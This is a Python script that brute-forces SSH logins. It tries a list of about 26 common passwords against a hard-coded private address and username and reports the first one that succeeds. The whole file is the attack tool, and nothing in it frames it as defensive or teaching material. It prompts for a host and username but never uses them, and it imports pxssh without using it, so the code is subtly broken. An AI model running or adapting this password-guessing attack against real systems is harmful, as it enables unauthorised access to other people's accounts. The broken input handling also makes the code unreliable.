from pexpect import pxssh
import time
import paramiko

def trypass(password,code = 0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect('10.211.55.4', username='parallels', password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code


s = pxssh.pxssh()
host = input('host: ')
user = input('username: ')
passwords = ['123456','123456789','qwerty','12345678','111111','1234567890','1234567','password','123123','987654321',
             'qwertyuiop','125412541','mynoob','123321','666666','18atcskd2w','7777777','1q2w3e4r','654321','555555',
             '3rjs1la7qe','google','1q2w3e4r5t','123qwe','zxcvbnm','1q2w3e']

for p in passwords:
    if trypass(p) == 0:
        print("password found!: " + p)
        raise SystemExit(0)
    else:
        print('not ' + p)
    #time.sleep(0.2)

print('cant find password')




